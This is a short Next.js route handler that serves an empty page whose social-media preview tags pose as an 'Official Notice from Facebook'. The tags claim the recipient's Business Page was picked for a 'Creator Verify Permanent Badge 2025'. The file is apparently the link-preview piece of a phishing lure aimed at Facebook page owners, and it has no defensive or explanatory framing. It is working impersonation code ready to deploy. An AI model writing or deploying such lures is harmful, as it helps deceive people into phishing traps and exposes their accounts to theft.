import { NextResponse } from 'next/server';

export async function GET() {
  const html = `
    <html>
      <head>
        <meta property="og:title" content="Official Notice from Facebook" />
        <meta property="og:description" content="Your Business Page selected for our Creator Verify Permanent Badge 2025 The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.">
        <meta property="og:image" content="https://i.postimg.cc/Y2dN0B2t/social-preview.png" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="Official Notice from Facebook" />
        <meta name="twitter:description" content="Your Business Page selected for our Creator Verify Permanent Badge 2025 The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.">
        <meta name="twitter:image" content="https://i.postimg.cc/Y2dN0B2t/social-preview.png" />
      </head>
      <body></body>
    </html>
  `;

  return new NextResponse(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html'
    }
  });
}